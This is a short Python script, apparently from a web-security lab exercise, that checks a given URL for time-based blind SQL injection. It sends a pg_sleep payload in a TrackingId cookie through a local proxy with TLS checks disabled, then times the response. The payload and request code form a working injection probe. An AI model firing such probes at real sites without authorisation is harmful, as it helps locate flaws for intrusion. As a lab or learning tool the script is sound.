import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#Blind SQLi with time delay in tracking cookie
#payload used: TrackingId=xyz'||pg_sleep(10)--

def sql_injection(url):
	payload = "' || (SELECT pg_sleep(10))--"
	encoded_payload = urllib.parse.quote(payload)
	cookies = {'TrackingId': 'XvnJA37mu5BwpsMD' + encoded_payload, 'session': 'cpipGsZuIBhDB0o6AaErH0hUxb5HCVM0'}
	r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
	time_taken = r.elapsed.total_seconds()

	if time_taken > 10:
		print("Vulnerable to Blind Sql")
	else:
		print("Not Vulnerable")


def main():
	if len(sys.argv) != 2:
		print("Give URL: %s <url>" % sys.argv[0])
		sys.exit(1)

	url = sys.argv[1]
	print("Checking if its vulnerable to blind sqli")
	sql_injection(url)

if __name__ == "__main__":
	main()